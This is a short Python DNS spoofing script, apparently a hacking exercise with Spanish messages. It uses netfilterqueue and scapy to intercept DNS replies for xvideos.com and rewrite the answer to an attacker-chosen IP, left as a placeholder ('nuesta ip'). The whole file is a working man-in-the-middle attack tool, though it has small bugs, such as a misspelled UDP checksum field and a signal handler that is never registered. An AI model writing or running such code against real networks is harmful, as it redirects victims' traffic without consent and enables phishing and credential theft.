#!/usr/bin/env python3
import netfilterqueue # type: ignore
import scapy.all as scapy
import signal
import sys



def handler(sig,frame):
    print(f"Exit")
    sys.exit(0)



def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    if scapy_packet.haslayer(scapy.DNSRR):
        name = scapy_packet[scapy.DNSQR].qname

        if b"xvideos.com" in name:
            print(f"Envenenando dominio xvideos.com")

            answer = scapy.DNSRR(rrname=name, rdata="nuesta ip")
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].cheksum

            packet.set_payload(scapy_packet.build())

    packet.accept()



queue = netfilterqueue.NetfilterQueue()
queue.bind(0, process_packet)
queue.run()